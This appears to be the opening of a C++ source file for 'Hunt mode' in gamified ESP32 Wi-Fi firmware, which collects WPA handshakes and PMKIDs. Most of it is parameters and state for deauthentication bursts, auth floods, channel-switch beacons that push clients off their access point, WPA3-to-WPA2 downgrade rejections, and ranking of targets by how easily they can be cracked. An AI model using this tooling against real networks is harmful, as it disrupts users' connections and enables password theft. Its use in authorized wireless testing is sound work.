/**
 * Hunt mode — the active Wi-Fi case.
 *
 * DNH observation, PMKID probes, and explicitly authorized MUDBALL deauth share
 * one CAMP/PATROL-aware radio owner. D-UCB chooses the next channel from actual
 * receipts; motion changes the cadence, never the authorization boundary.
 */

#include "hunt.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <M5Unified.h>
#include <math.h>
#include <atomic>
#include "spectrum.h"
#include "../core/wsl_bypasser.h"
#include "../core/capture.h"
#include "../core/config.h"
#include "../hamlet.h"
#include "../piglet/mood.h"
#include "../activity/pedometer.h"
#include "../audio/sfx.h"
#include "../haptic/haptic.h"
#include "../sync/nowflock_transport.h"
#include "../piglet/avatar.h"
#include "../piglet/weather.h"
#include "../core/power.h"
#include "../hal/sd_storage.h"
#include "../gfx/gfx.h"
#include "../defense/recon.h"
#include "../defense/potfile.h"
#include "../defense/xband.h"
#include "../defense/defense_pipeline.h"
#include "../util/debug_log.h"
#include "../util/time_math.h"
#include "../radio/c5monster_uart.h"

namespace Hunt {

// ==[ STATE ]==
static bool active = false;
static bool wifiInitOK = false;

#if HAMLET_DEBUG_LOG
// ==[ EAPOL DIAGNOSTICS ]== per-10s counters to see what frames arrive
static volatile uint32_t eapolRxM1 = 0, eapolRxM2 = 0, eapolRxM3 = 0, eapolRxM4 = 0;
static volatile uint32_t eapolCallbackHits = 0;  // how many times handleEAPOL entered

// ==[ DEAUTH DIAGNOSTICS ]== per-10s counters to see if deauths actually fire
static volatile uint32_t deauthTargetHits = 0;   // selectDeauthTarget() returned true
static volatile uint32_t deauthTargetMiss = 0;   // selectDeauthTarget() returned false
static volatile uint32_t deauthClientsSent = 0;  // actual client deauths fired in THROWING
static volatile uint32_t dataFramesSeen = 0;     // data frames entering callback (pre-busy gate)
static volatile uint32_t dataFramesTracked = 0;  // data frames that passed busy gate → trackClient
#endif
static std::atomic<bool> paused{false};
static std::atomic<uint8_t> currentChannel{1};
static std::atomic<bool> motionStationary{true};

static constexpr uint32_t FINGERPRINT_STREAK_WINDOW_MS = 30000;
static constexpr uint32_t FINGERPRINT_EVENT_COOLDOWN_MS = 60000;
static constexpr uint32_t SEQ_ANOMALY_WINDOW_MS = 10000;
static constexpr uint32_t RSSI_ANOMALY_WINDOW_MS = 5000;
static constexpr uint16_t SEQ_DELTA_ANOMALY = 500;

// ==[ D-UCB BANDIT PARAMS ]==
static constexpr float DUCB_GAMMA_CAMP          = 0.998f;
static constexpr float DUCB_GAMMA_PATROL_SLOW   = 0.997f;   // slow walk baseline
static constexpr float DUCB_GAMMA_PATROL_FAST   = 0.993f;   // fast walk (sps ~ 3.0)
static constexpr float DUCB_GAMMA_SPRINT        = 0.990f;
static constexpr float DUCB_GAMMA_LURK          = 0.999f;
static constexpr float DUCB_MIN_DPULLS          = 0.1f;     // below this = effectively unexplored
static constexpr float DUCB_PARTIAL_DECAY        = 0.9997f;  // partial bonus: ~144s half-life at 250ms ticks
// ==[ ADAPTIVE EXPLORATION ]==
static constexpr float DUCB_ALPHA_INIT           = 0.5f;     // initial exploration weight
static constexpr float DUCB_ALPHA_MIN            = 0.15f;    // floor -- 15% exploration always
static constexpr float DUCB_ALPHA_DECAY          = 0.0005f;  // halves at T=2000 ticks ~ 8 min CAMP
// ==[ BSSID NOVELTY ]== location-change detection for alpha reset (OPT-6: behavior-adaptive)
static constexpr uint32_t NOVELTY_WINDOW_CAMP    = 30000;    // CAMP: 30s (stationary, stable RF)
static constexpr uint32_t NOVELTY_WINDOW_PATROL  = 15000;    // PATROL: 15s (walking, RF changes faster)
static constexpr uint32_t NOVELTY_WINDOW_SPRINT  = 10000;    // SPRINT: 10s (fast movement, rapid RF change)
static constexpr uint32_t NOVELTY_MIN_BEACONS    = 10;       // minimum beacons to evaluate
static constexpr uint32_t NOVELTY_THRESHOLD      = 50;       // >50% novel BSSIDs = new area
// ==[ BURST DETECTION ]== 4+ new BSSIDs in 5s = immediate alpha reset
static constexpr uint32_t BURST_WINDOW_MS        = 5000;
static constexpr uint8_t  BURST_THRESHOLD        = 4;
// ==[ CQS: Channel Quality Score ]==
static constexpr float CQS_CAPTURE_BONUS         = 25.0f;    // must stand out vs steady-state CQS (~236 effective)

// ==[ TICK CADENCE PER BEHAVIOR ]==
static constexpr uint32_t TICK_MS_CAMP            = 250;
static constexpr uint32_t TICK_MS_PATROL          = 150;
static constexpr uint32_t TICK_MS_SPRINT          = 80;
static constexpr uint32_t TICK_MS_LURK            = 300;

// ==[ DEAUTH INTERVALS PER BEHAVIOR ]==
static constexpr uint32_t DEAUTH_INTERVAL_LURK           = 1500;
static constexpr uint32_t DEAUTH_INTERVAL_SPRINT          = 999999;   // effectively disabled
static constexpr uint32_t DEAUTH_INTERVAL_CAMP_ANGRY      = 1500;    // was 2500 — more attack cycles
static constexpr uint32_t DEAUTH_INTERVAL_CAMP_NORMAL     = 3000;    // was 6000 — ~20 cycles/min stationary
static constexpr uint32_t DEAUTH_INTERVAL_PATROL_ANGRY    = 3000;    // was 5000
static constexpr uint32_t DEAUTH_INTERVAL_PATROL_NORMAL   = 6000;    // was 12000 — ~10 cycles/min walking

// ==[ DEAUTH DWELL EXTENSION ]== fire-and-forget: extend dwell after deauth, no channel lock
static constexpr uint32_t DEAUTH_DWELL_EXTENSION    = 5000;   // 5s post-deauth dwell — clients need 3-10s to reconnect

// ==[ PROBE INTERVALS PER BEHAVIOR ]== tighter — no channel-hop overhead
static constexpr uint32_t PROBE_INTERVAL_CAMP      = 2000;
static constexpr uint32_t PROBE_INTERVAL_PATROL    = 3500;
static constexpr uint32_t PROBE_INTERVAL_SPRINT    = 6000;
static constexpr uint32_t PROBE_INTERVAL_LURK      = 1500;

// ==[ TARGET VALUE WEIGHTS ]==
static constexpr float TV_HAS_PMKID               = 0.05f;   // have PMKID, handshake still useful
static constexpr float TV_WPA2_PSK                 = 0.9f;
static constexpr float TV_WPA_WPA2_PSK             = 0.8f;
static constexpr float TV_TRANSITION_PMF           = 0.95f;   // PMF = PMKID-only = high value
static constexpr float TV_TRANSITION_NO_PMF        = 0.85f;
static constexpr float TV_WPA3_PSK                 = 0.4f;    // SAE downgrade only
static constexpr float TV_DEFAULT                  = 0.1f;
static constexpr float TV_PMF_PENALTY              = 0.3f;    // non-transition PMF penalty
static constexpr float TV_PROBE_RESPONSIVE         = 1.2f;    // responsive AP multiplier
static constexpr float TV_PROBE_UNRESPONSIVE       = 0.5f;    // unresponsive after 2+ probes

// ==[ CHANNEL QUALITY NORMALIZATION ]==
static constexpr float CQ_RSSI_OFFSET             = 90.0f;
static constexpr float CQ_RSSI_RANGE              = 50.0f;
static constexpr float CQ_AGE_SCALE               = 30000.0f;
static constexpr float CQ_CLIENTLESS_PMKID_FACTOR = 0.15f;
static constexpr float CQ_DENSITY_REF             = 10.0f;    // 10 nets -> ~1.0 density

// ==[ RSSI THRESHOLDS PER BEHAVIOR ]==
static constexpr int8_t RSSI_THRESH_CAMP           = -80;
static constexpr int8_t RSSI_THRESH_PATROL         = -65;
static constexpr int8_t RSSI_THRESH_SPRINT         = -55;
static constexpr int8_t RSSI_THRESH_LURK           = -75;

// ==[ HOP DELAY PER BEHAVIOR ]==
static constexpr uint32_t HOP_DELAY_CAMP           = 150;
static constexpr uint32_t HOP_DELAY_PATROL         = 80;
static constexpr uint32_t HOP_DELAY_SPRINT         = 50;
static constexpr uint32_t HOP_DELAY_LURK           = 5000;
static constexpr uint32_t HOP_DELAY_LEGACY         = 100;
static constexpr uint32_t HOP_DWELL_LOW            = 500;     // low-activity dwell
static constexpr uint32_t HOP_DWELL_HIGH_BASE      = 1000;    // high-activity base dwell
static constexpr uint32_t HOP_DWELL_HIGH_MAX_ADD   = 1000;    // max additional dwell from network count
static constexpr uint32_t HOP_PARTIAL_HS_EXTRA     = 1000;    // extra dwell for partial handshake
static constexpr uint32_t HOP_SPRINT_MAX_DWELL     = 800;

// ==[ DEAUTH ATTACK PARAMS ]==
static constexpr uint8_t DEAUTH_MAX_CLIENTS_LURK   = 4;
static constexpr uint8_t DEAUTH_MAX_CLIENTS_CAMP   = 3;
static constexpr uint8_t DEAUTH_MAX_CLIENTS_DEFAULT = 2;
static constexpr uint32_t DEAUTH_AGGRESSIVE_INTERVAL = 30;    // ms between burst frames (aggressive)
static constexpr uint32_t DEAUTH_NORMAL_INTERVAL    = 50;     // ms between burst frames (normal)
static constexpr uint8_t AUTH_FLOOD_COUNT           = 10;
static constexpr uint8_t AUTH_FLOOD_INTERVAL        = 10;
static constexpr uint8_t CSA_BEACON_COUNT_INITIAL   = 1;   // 1 = switch before next TBTT (immediate)
// ==[ CSA DISRUPT CHANNEL ]== pick a far non-overlapping channel to herd clients OFF the AP.
// clients must scan+reconnect on real channel → triggers fresh 4-way handshake.
static inline uint8_t csaDisruptChannel(uint8_t apChannel) {
    if (apChannel <= 4)  return 11;   // low → high
    if (apChannel >= 9)  return 1;    // high → low
    return (apChannel <= 6) ? 13 : 1; // mid → opposite end
}
static constexpr uint8_t MAX_DEAUTH_BURST           = 30;     // hard cap on burst count

// ==[ DEAUTH BURST BASE COUNTS ]==
static constexpr uint8_t BURST_ACTIVE_NORMAL        = 3;      // very active client (< 1s)
static constexpr uint8_t BURST_ACTIVE_ANGRY         = 12;
static constexpr uint8_t BURST_RECENT_NORMAL        = 4;      // active client (< 3s)
static constexpr uint8_t BURST_RECENT_ANGRY         = 15;
static constexpr uint8_t BURST_SEMI_NORMAL          = 5;      // semi-active (< 8s)
static constexpr uint8_t BURST_SEMI_ANGRY           = 18;
static constexpr uint8_t BURST_STALE_NORMAL         = 7;      // getting stale (< 15s)
static constexpr uint8_t BURST_STALE_ANGRY          = 22;
static constexpr uint8_t BURST_SLEEPY_NORMAL        = 10;     // sleepy client
static constexpr uint8_t BURST_SLEEPY_ANGRY         = 25;
static constexpr uint32_t BURST_AGE_ACTIVE          = 1000;   // < 1s = very active
static constexpr uint32_t BURST_AGE_RECENT          = 3000;   // < 3s = active
static constexpr uint32_t BURST_AGE_SEMI            = 8000;   // < 8s = semi-active
static constexpr uint32_t BURST_AGE_STALE           = 15000;  // < 15s = getting stale
static constexpr float LURK_BURST_MULTIPLIER        = 1.3f;

// ==[ LURK PARAMS ]==
static constexpr uint32_t LURK_TIMEOUT_AUTO         = 45000;
static constexpr int8_t LURK_INITIAL_RSSI           = -40;
static constexpr int8_t LURK_AUTO_RSSI_THRESH       = -55;    // auto-lurk signal requirement
static constexpr uint8_t LURK_AUTO_MIN_CLIENTS      = 2;
static constexpr float LURK_AUTO_MIN_TV              = 0.7f;   // minimum target value for auto-lurk
static constexpr float LURK_AUTO_SCORE_THRESH        = 0.85f;  // composite score threshold
static constexpr uint32_t LURK_FRESH_MS              = 5000;   // network freshness for auto-lurk
static constexpr uint32_t LURK_RSSI_TIMEOUT          = 10000;  // RSSI loss timeout
static constexpr int8_t LURK_EXIT_RSSI_NORMAL        = -70;

// ==[ ACTIVE NETWORK TIMEOUTS ]==
static constexpr uint32_t ACTIVE_TIMEOUT_CAMP        = 30000;
static constexpr uint32_t ACTIVE_TIMEOUT_PATROL       = 10000;
static constexpr uint32_t ACTIVE_TIMEOUT_SPRINT       = 5000;

// ==[ CLIENT FRESHNESS PER BEHAVIOR ]==
static constexpr uint32_t CLIENT_FRESH_CAMP          = 15000;
static constexpr uint32_t CLIENT_FRESH_BASE          = 8000;   // PATROL/SPRINT base
static constexpr uint32_t CLIENT_FRESH_MAX_REDUCE    = 4000;   // max step-rate reduction

// ==[ BEHAVIOR FSM DEBOUNCE ]==
static constexpr uint8_t DEBOUNCE_CAMP_TO_PATROL     = 8;     // 8 x 250ms = 2s
static constexpr uint8_t DEBOUNCE_PATROL_TO_SPRINT   = 20;    // 20 x 150ms = 3s
static constexpr uint8_t DEBOUNCE_SPRINT_TO_PATROL   = 13;    // 13 x 150ms = 2s
static constexpr uint8_t DEBOUNCE_PATROL_TO_CAMP     = 1;     // instant (pedometer already debounces 5s)
static constexpr float SPRINT_SPS_THRESHOLD          = 2.5f;  // steps/sec for SPRINT transition

// ==[ DEAUTH CACHE ]==
static constexpr uint32_t DEAUTH_COOLDOWN_MS         = 10000;   // 10s — retry sooner on failed captures
static constexpr uint16_t DEAUTH_CACHE_SIZE          = 256;

// ==[ PARTIAL HANDSHAKE RETRY ]==
static constexpr uint8_t MAX_RETRY_QUEUE             = 4;
static constexpr uint32_t PARTIAL_RETRY_DELAY        = 10000;
static constexpr uint8_t MAX_RETRY_ATTEMPTS          = 2;

// ==[ NETWORK CHURN ]==
static constexpr uint32_t DEAD_AIR_THRESHOLD         = 15000;
static constexpr uint32_t STALE_PENDING_TIMEOUT      = 25000;

// ==[ HANDSHAKE TRACKING ]==
static constexpr uint8_t MAX_PENDING_HANDSHAKES      = 8;
static constexpr uint32_t HANDSHAKE_TIMEOUT          = 30000;
static constexpr uint32_t HANDSHAKE_GRACE_PERIOD     = 500;
static constexpr uint16_t EAPOL_KEY_NONCE_OFFSET     = 17;
static constexpr uint8_t EAPOL_KEY_NONCE_SIZE        = 32;

// ==[ PROBE HARVEST ]==
static constexpr uint16_t MAX_HARVESTED_PROBES       = 128;

// ==[ PROBE SCORING WEIGHTS ]==
static constexpr float PROBE_RSSI_WEIGHT             = 0.35f;
static constexpr float PROBE_AUTH_WEIGHT             = 0.30f;
static constexpr float PROBE_FRESH_WEIGHT            = 0.20f;
static constexpr float PROBE_CONFIRM_WEIGHT          = 0.15f;
static constexpr float PROBE_RETRY_BONUS             = 0.15f;
static constexpr float PROBE_SCORE_SCALE             = 10000.0f;

// ==[ PROBE AUTH VALUES ]==
static constexpr float PROBE_AUTH_TRANSITION_PMF     = 1.0f;
static constexpr float PROBE_AUTH_WPA2               = 0.85f;
static constexpr float PROBE_AUTH_TRANSITION         = 0.75f;
static constexpr float PROBE_AUTH_MIXED              = 0.65f;
static constexpr float PROBE_AUTH_DEFAULT            = 0.3f;

// ==[ DEAUTH SCORING WEIGHTS ]==
static constexpr float DEAUTH_SIGNAL_WEIGHT          = 0.25f;
static constexpr float DEAUTH_VALUE_WEIGHT           = 0.25f;
static constexpr float DEAUTH_FRESH_WEIGHT           = 0.15f;
static constexpr float DEAUTH_TREND_WEIGHT           = 0.10f;
static constexpr float DEAUTH_DENSITY_WEIGHT         = 0.10f;
static constexpr float DEAUTH_SCORE_SCALE            = 10000.0f;

// ==[ MOTION-AWARE DWELL THRESHOLDS ]==
static constexpr int8_t DWELL_APPROACH_FAST_THRESH   = 5;     // strong approach trend
static constexpr int8_t DWELL_RETREAT_FAST_THRESH    = -5;    // strong retreat trend
static constexpr int8_t DWELL_APPROACH_CAMP_THRESH   = 3;

// ==[ RSSI ANOMALY ]==
static constexpr int8_t RSSI_ANOMALY_JUMP_THRESH     = 15;    // dBm jump to flag anomaly

// ==[ COMBO PARAMS ]==
static constexpr float COMBO_PITCH_BASE              = 1.06f;
static constexpr float COMBO_PITCH_MAX               = 1.19f;

// ==[ D-UCB PARTIAL REWARD ]==
static constexpr float PARTIAL_REWARD_BONUS          = 3.0f;
static constexpr float PARTIAL_BONUS_CAP             = 5.0f;

// ==[ SAE REJECT COOLDOWN ]==
static constexpr uint32_t SAE_REJECT_COOLDOWN_MS     = 500;

// ==[ LED FLASH DURATIONS ]==
static constexpr uint32_t LED_FLASH_HANDSHAKE        = 200;
static constexpr uint32_t LED_FLASH_PMKID            = 100;

// ==[ PROBE VULN CHECK INTERVAL ]==
static constexpr uint32_t PROBE_VULN_CHECK_INTERVAL  = 2000;

// ==[ EXPOSURE TICK LIMITS ]==
static constexpr uint8_t MAX_EXPOSURE_TICKS          = 12;
static constexpr uint32_t EXPOSURE_RESYNC_MS         = 5000;

// ==[ MISC THRESHOLDS ]==
static constexpr uint32_t HIDDEN_PROBE_COOLDOWN      = 3000;
static constexpr uint8_t MIN_BEACONS_FOR_PROBE       = 3;
static constexpr uint32_t NETWORK_STALE_MS           = 30000;
static constexpr uint32_t NETWORK_RETRY_STALE_MS     = 30000;
static constexpr float PATROL_SPS_NORMALIZE          = 3.0f;  // steps/sec normalization for patrol gamma
static constexpr uint32_t BEACON_MAX_STAGE_LEN       = 512;
static constexpr uint32_t AP_BEACON_INTERVAL         = 60000; // minimal beacon interval for hidden AP
static constexpr uint32_t SSID_SHOW_CHANCE            = 15;    // 1-in-N chance to show SSID
static constexpr uint32_t FIRST_PROBE_DELAY          = 2000;  // delay before first probe after start

// ==[ DEFERRED SFX FLAGS ]== callback-safe, non-blocking
// Written from promiscuous callback (core 0), read from update() (core 1)
static std::atomic<bool> pendingPMKIDBeep{false};
static std::atomic<bool> pendingHandshakeBeep{false};
static std::atomic<bool> pendingDeauthBeep{false};
static std::atomic<uint8_t> pendingEAPOLTick{0};  // 1-4 for M1-M4 tick
// ==[ RACE GUARD ]== atomic busy flag: callback skips if main loop iterates networks[]
static std::atomic<bool> huntBusy{false};

// ==[ DEFERRED CALLBACK OPS ]== callback stages data, update() does heavy work
// Pattern: memcpy in callback (safe), PSRAM/NVS/I2C/TX in update() (safe)
// Contract: callback writes ALL payload fields BEFORE storing ready=true.
//           update() checks ready (atomic acquire), reads payload, then clears ready.

struct PendingPMKIDCapture {
    uint8_t pmkidBytes[16];     // raw PMKID (memcpy from RSN)
    uint8_t bssid[6];           // AP MAC (for network lookup)
    uint8_t station[6];         // our STA MAC
    uint16_t totalLifetime;     // capped at 65535, more than enough
    bool isFirstCapture;
    std::atomic<bool> ready{false};  // release-store in callback, acquire-load in update()
};
static PendingPMKIDCapture pendingPMKID = {};

struct PendingBeaconStore {
    uint8_t bssid[6];
    uint8_t* data;            // PSRAM staging buffer (allocated in start(), avoids DRAM bloat)
    uint16_t len;
    std::atomic<bool> ready{false};  // release-store in callback, acquire-load in update()
};
static PendingBeaconStore pendingBeacon = {};

// Deferred free queue for LRU eviction (heap_caps_free is not callback-safe).
// Each slot is an atomic ptr, nullptr = empty. Producer CAS-claims the first
// empty slot; drainer exchange-reads each slot to nullptr and frees if non-null.
// No separate count: the prior count+array scheme had an orphan-ptr window
// where drain's exchange(0) could land between a producer's CAS and its slot
// write, leaving ptr with count=0 so the next producer overwrote without free.
// Sized 32: in dense RF (networks[] full at 64) any new AP triggers an LRU
// eviction → one pending free. An 8-slot queue filled in <200ms of steady
// churn, after which overflowing frees leak up to 512B each silently.
static std::atomic<uint8_t*> pendingBeaconFreeQueue[32] = {};

static inline void queueBeaconFree(uint8_t* ptr) {
    if (!ptr) return;
    for (size_t i = 0; i < sizeof(pendingBeaconFreeQueue) / sizeof(pendingBeaconFreeQueue[0]); i++) {
        uint8_t* expected = nullptr;
        if (pendingBeaconFreeQueue[i].compare_exchange_strong(expected, ptr,
                std::memory_order_acq_rel, std::memory_order_relaxed)) {
            return;
        }
        // slot occupied — move on
    }
    // All slots full — intentional leak (rare, <=512 bytes per beacon frame).
}

static inline void drainBeaconFrees() {
    for (size_t i = 0; i < sizeof(pendingBeaconFreeQueue) / sizeof(pendingBeaconFreeQueue[0]); i++) {
        uint8_t* ptr = pendingBeaconFreeQueue[i].exchange(nullptr, std::memory_order_acq_rel);
        if (ptr) heap_caps_free(ptr);
    }
}

// Cache our hidden AP MAC once at init; avoids esp_wifi_get_mac() inside promisc callback.
static uint8_t ourApMac[6] = {0};
static bool ourApMacValid = false;

// Cache STA MAC at start; esp_wifi_get_mac() is NOT callback-safe (touches WiFi driver internals)
static uint8_t ourStaMac[6] = {0};

// ==[ SAE DOWNGRADE ]== deferred reject for transition mode WPA3→WPA2 forcing
struct PendingSAEReject {
    uint8_t bssid[6];
    uint8_t client[6];
    uint8_t authSeq;
    std::atomic<bool> ready{false};
};
static PendingSAEReject pendingSAEReject = {};
static uint32_t lastSAERejectTime = 0;  // cooldown to avoid spamming

// ==[ DEFERRED MOOD/AVATAR OPS ]== Mood/Avatar/SFX calls are NOT callback-safe
// (heap alloc, non-volatile shared state, audio queues). Stage flags here, process in update().
// Contract: callback writes payload fields FIRST, then stores flag with memory_order_release.
//           update() loads flag with memory_order_acquire, then reads payload fields.
static std::atomic<bool> pendingNewNetwork{false};           // handleBeacon → Mood::onNewNetwork + waveRipple
static std::atomic<bool> pendingNewNetworkSSID{false};       // handleBeacon → Mood::setPhrase(SSID)
static portMUX_TYPE pendingSSIDMux = portMUX_INITIALIZER_UNLOCKED;  // spinlock for pendingSSIDBuf
static volatile char pendingSSIDBuf[16] = {0};               // payload — guarded by pendingSSIDMux + pendingNewNetworkSSID (with release/acquire semantics)
static portMUX_TYPE hsMux = portMUX_INITIALIZER_UNLOCKED;    // spinlock for pendingHandshakes[]
static portMUX_TYPE pendingHSMux = portMUX_INITIALIZER_UNLOCKED;  // spinlock for pendingHSMask + pendingHSSSID payload
static std::atomic<bool> pendingClientSpotted{false};        // handleEAPOL → Mood::onClientSpotted
static std::atomic<bool> pendingHSProgress{false};           // handleEAPOL → Mood::onHandshakeProgress
static volatile uint8_t pendingHSMask = 0;                   // payload — guarded by pendingHSMux + pendingHSProgress
static volatile char pendingHSSSID[33] = {0};                // payload — guarded by pendingHSMux + pendingHSProgress
static std::atomic<uint8_t> pendingNeedM2{0};                // 1 = "M3+M4 NEED M2!", 2 = "M1+M4 NEED M2!"
static std::atomic<bool> pendingClearRetry{false};           // handleEAPOL → clearRetryForClient
static volatile uint8_t pendingClearRetryBSSID[6] = {0};     // payload — guarded by pendingClearRetry
static volatile uint8_t pendingClearRetryStation[6] = {0};   // payload — guarded by pendingClearRetry
static std::atomic<bool> pendingPartialReward{false};        // handleEAPOL → recordPartialReward
static volatile uint8_t pendingPartialChannel = 0;           // payload — guarded by pendingPartialReward
static volatile float pendingPartialBonus = 0.0f;            // payload — guarded by pendingPartialReward
static portMUX_TYPE pendingPartialMux = portMUX_INITIALIZER_UNLOCKED;

// ==[ DEFERRED CLIENT ADD ]== handleEAPOL stages client info here; update() commits to networks[].
// This avoids concurrent writes to networks[] from the promisc callback (core 0) + main loop (core 1).
static constexpr uint8_t PENDING_CLIENT_QUEUE_SIZE = 4;
struct PendingClientAdd {
    uint8_t bssid[6];
    uint8_t staMac[6];
    int8_t rssi;
    uint32_t lastSeen;
};
static PendingClientAdd pendingClientQueue[PENDING_CLIENT_QUEUE_SIZE] = {};
static std::atomic<uint8_t> pendingClientQueueCount{0};

static void queueClientAdd(const uint8_t* bssid, const uint8_t* sta, int8_t rssi, uint32_t now) {
    uint8_t idx = pendingClientQueueCount.load(std::memory_order_relaxed);
    if (idx >= PENDING_CLIENT_QUEUE_SIZE) return;  // drop if full (rare)
    PendingClientAdd& entry = pendingClientQueue[idx];
    memcpy(entry.bssid, bssid, 6);
    memcpy(entry.staMac, sta, 6);
    entry.rssi = rssi;
    entry.lastSeen = now;
    pendingClientQueueCount.store(idx + 1, std::memory_order_release);
}

// drainPendingClients() defined after hash table functions (needs hashFindNetwork, networks[])

// ==[ PROBE HARVEST ]== passive client probe collection (callback-safe, zero TX)
// clients broadcast probe requests with SSIDs of previously-connected networks.
// filter out locally-administered MACs (randomized = useless identity).
static Hunt::HarvestedProbe* harvestedProbes = nullptr;  // PSRAM, alloc in start()
static uint16_t harvestedCount = 0;
static uint16_t totalProbeRequests = 0;

// ==[ PROBE RESPONSE KARMA TRACKER ]== detect one BSSID claiming multiple SSIDs
// callback writes, update() reads — small ring of recent (BSSID, SSID) pairs
static constexpr uint8_t KARMA_RING_SIZE = 16;
struct KarmaProbeEntry {
    uint8_t bssid[6];
    char ssid[33];
};
static KarmaProbeEntry karmaRing[KARMA_RING_SIZE];
static std::atomic<uint8_t> karmaRingHead{0};
static std::atomic<uint8_t> karmaRingCount{0};
static std::atomic<bool> pendingKarmaCheck{false};

// ==[ BEHAVIOR FSM ]== 4-state: CAMP ↔ PATROL ↔ SPRINT, CAMP → LURK → CAMP
static HuntBehavior currentBehavior = HuntBehavior::CAMP;
// transition debounce: sustained condition required to prevent oscillation
static HuntBehavior pendingBehavior = HuntBehavior::CAMP;
static uint8_t transitionDebounce = 0;
// ==[ LURK STATE ]== focused attack on high-value target
static bool lurkActive = false;
static uint8_t lurkChannel = 0;           // channel locked during LURK
static uint32_t lurkStartTime = 0;        // entry timestamp
static uint32_t lurkTimeout = 45000;      // auto-exit timeout
static int8_t lurkTargetRSSI = -90;       // track target RSSI for exit condition
static uint32_t lurkRSSILostTime = 0;     // when RSSI dropped below threshold

// ==[ NETWORKS ]== PSRAM-backed (saves ~18KB DRAM)
static DetectedNetwork* networks = nullptr;
static uint16_t networkCount = 0;

// ==[ BSSID HASH TABLE ]== O(1) network lookup by MAC
// open-addressing, linear probe. PSRAM-backed to avoid DRAM pressure.
static constexpr uint16_t HUNT_HASH_SIZE = 128;
static constexpr uint16_t HUNT_HASH_EMPTY = 0xFFFF;
static uint16_t* networkHashTable = nullptr;  // allocated in enterHunt()

static inline uint32_t bssidHash6(const uint8_t* bssid) {
    uint32_t h = 2166136261u;
    for (int i = 0; i < 6; i++) h = (h ^ bssid[i]) * 16777619u;
    return h;
}

// find network index by BSSID, returns HUNT_HASH_EMPTY if not found
static uint16_t hashFindNetwork(const uint8_t* bssid) {
    if (!networkHashTable) {
        // fallback: linear scan if PSRAM alloc failed
        for (uint16_t i = 0; i < networkCount; i++) {
            if (memcmp(networks[i].bssid, bssid, 6) == 0) return i;
        }
        return HUNT_HASH_EMPTY;
    }
    uint32_t slot = bssidHash6(bssid) & (HUNT_HASH_SIZE - 1);
    for (uint16_t probe = 0; probe < HUNT_HASH_SIZE; probe++) {
        uint16_t idx = networkHashTable[(slot + probe) & (HUNT_HASH_SIZE - 1)];
        if (idx == HUNT_HASH_EMPTY) return HUNT_HASH_EMPTY;
        if (memcmp(networks[idx].bssid, bssid, 6) == 0) return idx;
    }
    return HUNT_HASH_EMPTY;
}

static void hashRebuildNetworks();  // forward declaration (mutual recursion with hashInsertNetwork)

static bool hashInsertNetwork(const uint8_t* bssid, uint16_t idx) {
    if (!networkHashTable) return false;
    uint32_t slot = bssidHash6(bssid) & (HUNT_HASH_SIZE - 1);
    for (uint16_t probe = 0; probe < HUNT_HASH_SIZE; probe++) {
        uint16_t& entry = networkHashTable[(slot + probe) & (HUNT_HASH_SIZE - 1)];
        if (entry == HUNT_HASH_EMPTY || entry == idx) {
            entry = idx;
            return true;
        }
    }
    // Hash table full — rebuild and retry once
    hashRebuildNetworks();
    slot = bssidHash6(bssid) & (HUNT_HASH_SIZE - 1);
    for (uint16_t probe = 0; probe < HUNT_HASH_SIZE; probe++) {
        uint16_t& entry = networkHashTable[(slot + probe) & (HUNT_HASH_SIZE - 1)];
        if (entry == HUNT_HASH_EMPTY || entry == idx) {
            entry = idx;
            return true;
        }
    }
    return false;  // still full after rebuild — genuinely at capacity
}

// rebuild entire hash table from networks array
static void hashRebuildNetworks() {
    if (!networkHashTable) return;
    memset(networkHashTable, 0xFF, sizeof(uint16_t) * HUNT_HASH_SIZE);
    for (uint16_t i = 0; i < networkCount; i++) {
        // skip zeroed-out slots (evicted but not compacted)
        if (networks[i].bssid[0] == 0 && networks[i].bssid[1] == 0 &&
            networks[i].bssid[2] == 0 && networks[i].bssid[3] == 0 &&
            networks[i].bssid[4] == 0 && networks[i].bssid[5] == 0) continue;
        hashInsertNetwork(networks[i].bssid, i);
    }
}

// ==[ DEFERRED CLIENT DRAIN ]== commit staged client-adds from promisc callback to networks[].
// Placed here (after hash table + networks[]) because it depends on hashFindNetwork + HUNT_HASH_EMPTY.
static void drainPendingClients() {
    uint8_t count = pendingClientQueueCount.exchange(0, std::memory_order_acq_rel);
    for (uint8_t q = 0; q < count; q++) {
        PendingClientAdd& entry = pendingClientQueue[q];
        uint16_t ei = hashFindNetwork(entry.bssid);
        if (ei == HUNT_HASH_EMPTY) continue;
        // Add client if not already tracked
        bool found = false;
        for (uint8_t c = 0; c < networks[ei].clientCount; c++) {
            if (memcmp(networks[ei].clients[c].mac, entry.staMac, 6) == 0) {
                found = true;
                networks[ei].clients[c].lastSeen = entry.lastSeen;
                networks[ei].clients[c].rssi = entry.rssi;
                break;
            }
        }
        if (!found) {
            uint8_t slot;
            if (networks[ei].clientCount < MAX_CLIENTS_PER_NETWORK) {
                slot = networks[ei].clientCount;
                networks[ei].clientCount++;
            } else {
                uint32_t oldestTime = UINT32_MAX;
                slot = 0;
                for (uint8_t c = 0; c < MAX_CLIENTS_PER_NETWORK; c++) {
                    if (networks[ei].clients[c].lastSeen < oldestTime) {
                        oldestTime = networks[ei].clients[c].lastSeen;
                        slot = c;
                    }
                }
            }
            memcpy(networks[ei].clients[slot].mac, entry.staMac, 6);
            networks[ei].clients[slot].rssi = entry.rssi;
            networks[ei].clients[slot].lastSeen = entry.lastSeen;
        }
    }
}

// ==[ CHANNEL STATS ]==
static ChannelStats channelStats[14];  // 1-13 + unused 0

// ==[ TREE STATE ]== fruit tree visible during CAMP
static bool treeVisible = false;

// ==[ CHANNEL HOP STATE ]== drives grass animation
static bool channelHopping = true;

static uint8_t getTreeFruitCount() {
    // count networks on current channel that are attackable AND have clients.
    // no clients = no tree. pig only cares about real targets.
    uint8_t fruits = 0;
    for (uint16_t i = 0; i < networkCount; i++) {
        if (networks[i].channel == currentChannel &&
            !networks[i].hasPMF &&
            networks[i].clientCount > 0) {
            fruits++;
        }
    }
    if (fruits > 8) fruits = 8;
    return fruits;
}

// ==[ COORDINATION ]==
static bool coordinationEnabled = false;      // Whether coordination is active
static uint8_t coordinationRole = 1;         // 0=master, 1=slave, 2=standalone
static uint8_t assignedChannel = 0;          // Channel assigned by master (0 = no assignment)
static uint32_t assignedUntil = 0;           // Time until which assignment is valid
static uint8_t priorityAdjustments[13] = {0}; // Priority adjustments from master

// ==[ D-UCB BANDIT ]== Discounted UCB for non-stationary channel selection
// Garivier & Moulines 2011: exponentially discount past observations.
